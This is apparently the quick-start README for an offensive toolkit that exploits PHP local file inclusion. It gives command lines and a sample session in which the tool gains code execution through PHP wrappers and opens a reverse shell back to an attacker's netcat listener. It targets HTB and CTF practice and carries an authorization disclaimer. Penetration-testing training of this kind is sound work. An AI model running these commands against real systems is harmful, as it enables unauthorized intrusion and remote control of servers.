# 🚀 START HERE - Quick Setup Guide
## Ghost Ops Security LFI Exploitation Toolkit

---

## ⚡ 60-Second Setup

```bash
# 1. Install dependencies (5 seconds)
pip3 install -r requirements.txt

# 2. Run the tool (10 seconds)
python3 lfi_exploiter.py -u http://target.com/page.php -p file --auto

# 3. Choose your option when prompted (5 seconds)
#    1) Interactive shell
#    2) Reverse shell
#    3) Exit

# 4. Start hacking! (40 seconds)
```

**That's it!** You're ready to exploit LFI vulnerabilities.

---

## 🎯 The ONE Tool You Need

### **lfi_exploiter.py**

This unified tool automatically:
- ✅ Checks PHP configuration
- ✅ Tests for LFI vulnerability  
- ✅ Tests all HTB Academy wrappers
- ✅ Finds working RCE method
- ✅ Gives you a shell

**No complex setup. No multiple tools. Just ONE command.**

---

## 📚 Three Commands to Remember

### 1. Auto-Exploit (Recommended)
```bash
python3 lfi_exploiter.py -u http://target.com/page.php -p file --auto
```
**What it does:** Everything automatically, then asks what you want

### 2. Interactive Shell
```bash
python3 lfi_exploiter.py -u http://target.com/page.php -p file --auto --shell
```
**What it does:** Gets you a web-based shell immediately

### 3. Reverse Shell
```bash
python3 lfi_exploiter.py -u http://target.com/page.php -p file --auto --revshell --lhost 10.10.10.1
```
**What it does:** Deploys reverse shell to your IP (have `nc -lvnp 4444` ready)

---

## 🎓 First-Time User Path

### Step 1: Read This File (You're doing it!)
**Time:** 2 minutes

### Step 2: Read LFI_EXPLOITER_GUIDE.md
**Time:** 10 minutes
**Why:** Learn all features and options

### Step 3: Try on HTB Box
**Time:** 5 minutes
```bash
# Find an HTB box with LFI
python3 lfi_exploiter.py -u http://10.10.10.X/index.php?page=home -p page --auto
```

### Step 4: Master It
**Time:** 30 minutes
- Try all options
- Test different targets
- Read PHP_WRAPPERS_GUIDE.md for theory

**Total Time to Proficiency:** ~47 minutes

---

## 📖 Documentation Quick Reference

**Need to know...**

| ...how to use the tool? | READ: `LFI_EXPLOITER_GUIDE.md` |
| ...HTB Academy techniques? | READ: `PHP_WRAPPERS_GUIDE.md` |
| ...quick commands? | READ: `QUICK_REFERENCE.txt` |
| ...how it works? | READ: `WORKFLOW_DIAGRAM.txt` |
| ...everything? | READ: `FINAL_SUMMARY.md` |

---

## 💻 Example Session

```bash
# Terminal 1: Run the tool
$ python3 lfi_exploiter.py -u http://target.com/page.php -p file --auto

[PHASE 1] PHP Configuration Check
✓ allow_url_include = On

[PHASE 2] LFI Vulnerability Test  
✓ LFI vulnerability confirmed!

[PHASE 3.2] Testing data:// Wrapper
✓ data:// wrapper (base64) RCE successful!

[SUCCESS] RCE Achieved!

[?] What would you like to do?
  1) Interactive shell
  2) Reverse shell
  3) Exit

Choice [1]: 2

Enter your IP: 10.10.10.1
Enter your port [4444]: 4444

[*] Attempting reverse shell connection...
[+] Payload sent! Check your listener.

# Terminal 2: Your listener
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.1] from target.com [10.10.10.50] 54321

www-data@target:~$ whoami
www-data

www-data@target:~$ cat /root/flag.txt
HTB{...}
```

---

## 🎯 Common Scenarios

### Scenario: "I found LFI, need shell fast"
```bash
python3 lfi_exploiter.py -u <URL> -p <param> --auto --shell
```

### Scenario: "I want reverse shell"
```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 lfi_exploiter.py -u <URL> -p <param> --auto --revshell --lhost <YOUR_IP>
```

### Scenario: "Just check if vulnerable"
```bash
python3 lfi_exploiter.py -u <URL> -p <param> --check-config
```

### Scenario: "Use with Burp Suite"
```bash
python3 lfi_exploiter.py -u <URL> -p <param> --auto --proxy http://127.0.0.1:8080
```

---

## ❓ FAQ

**Q: Which tool should I use first?**
A: `lfi_exploiter.py` - It's the unified tool that does everything.

**Q: Do I need to know which wrapper to use?**
A: No! The tool tests all of them automatically in the right order.

**Q: Can I get a reverse shell?**
A: Yes! Use `--revshell` flag or type `revshell` in the interactive shell.

**Q: What if it doesn't work?**
A: Try with `--proxy http://127.0.0.1:8080` to see requests in Burp and debug.

**Q: Is this legal?**
A: Only use on systems you have written permission to test (your own, HTB, CTFs, etc.)

---

## 🚨 Important Notes

### Before You Start
1. ✅ Have authorization (CTF, HTB, your own lab, or client permission)
2. ✅ Know your target URL and parameter
3. ✅ For reverse shell: know your IP (`ifconfig` or `ip a`)

### While Testing
1. 🔍 Use `--proxy` with Burp for detailed analysis
2. 📝 Document successful methods
3. 🧹 Clean up any webshells after testing

### After Success
1. 📋 Note which method worked
2. 💾 Save your commands for report
3. 🎯 Continue with post-exploitation

---

## 🎁 Bonus: Other Tools in This Toolkit

While `lfi_exploiter.py` handles 90% of use cases, you have more tools:

**For manual testing:**
- `file_inclusion_tool.py` - Granular control

**For learning:**
- `wrapper_generator.py` - See exact commands
- `payload_generator.py` - Generate payloads

**For advanced use:**
- `advanced_wrappers.py` - Custom techniques

---

## 🏆 Success Checklist

After using this toolkit, you should be able to:

- [ ] Identify LFI vulnerabilities
- [ ] Check PHP configuration  
- [ ] Test HTB Academy wrapper techniques
- [ ] Achieve RCE
- [ ] Deploy interactive shells
- [ ] Deploy reverse shells
- [ ] Complete HTB boxes
- [ ] Pass security assessments

---

## 🎓 Learning Resources

**Included in this toolkit:**
1. LFI_EXPLOITER_GUIDE.md - Complete guide
2. PHP_WRAPPERS_GUIDE.md - HTB Academy techniques
3. WORKFLOW_DIAGRAM.txt - Visual guides

**External resources:**
- HTB Academy - File Inclusion module
- OWASP Testing Guide - LFI/RFI
- PortSwigger Web Security Academy

---

## 💡 Pro Tips

1. **Always start with `--auto`** - It's smart enough to find the best method
2. **Use interactive shell first** - Enumerate before deploying reverse shell
3. **Have Burp running** - Use `--proxy` to understand what's happening
4. **Read the output** - The tool tells you exactly what it's doing
5. **Type `revshell` anytime** - Upgrade from interactive to reverse shell

---

## 🚀 You're Ready!

```bash
# The command to rule them all:
python3 lfi_exploiter.py -u <YOUR_TARGET_URL> -p <VULNERABLE_PARAM> --auto
```

**Now go hack (responsibly)!** 🔐

---

**Ghost Ops Security** | For Authorized Testing Only
